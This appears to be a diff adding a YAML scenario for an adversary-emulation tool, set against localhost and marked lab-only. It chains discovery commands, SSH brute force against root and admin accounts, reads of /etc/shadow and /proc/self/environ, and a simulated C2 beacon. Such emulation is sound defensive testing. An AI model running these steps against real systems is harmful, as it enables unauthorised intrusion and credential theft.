@@ -1,0 +1,51 @@
+name: initial_access_simulation
+description: >
+  Simulate an initial access attack chain: reconnaissance via command execution,
+  brute-force credential access, and C2 beacon establishment.
+  WARNING: Only run in isolated lab environments.
+
+target: localhost
+
+stages:
+  - name: reconnaissance
+    technique: T1059
+    description: Execute discovery commands to enumerate the target system
+    params:
+      commands:
+        - whoami
+        - hostname
+        - uname -a
+        - id
+        - cat /etc/passwd
+
+  - name: credential_access
+    technique: T1110
+    description: Attempt brute-force SSH login against the target
+    params:
+      service: ssh
+      target: "{{ target }}"
+      port: 22
+      usernames:
+        - root
+        - admin
+        - user
+      password_list: common_passwords.txt
+      max_attempts: 10
+
+  - name: credential_dumping
+    technique: T1003
+    description: Attempt to read credential files on the target
+    params:
+      targets:
+        - /etc/passwd
+        - /etc/shadow
+        - /proc/self/environ
+
+  - name: establish_c2
+    technique: T1071
+    description: Simulate C2 beacon communication over HTTP
+    params:
+      protocol: https
+      beacon_interval: 30
+      beacon_count: 3
+      callback_url: "http://{{ target }}:8443/beacon"
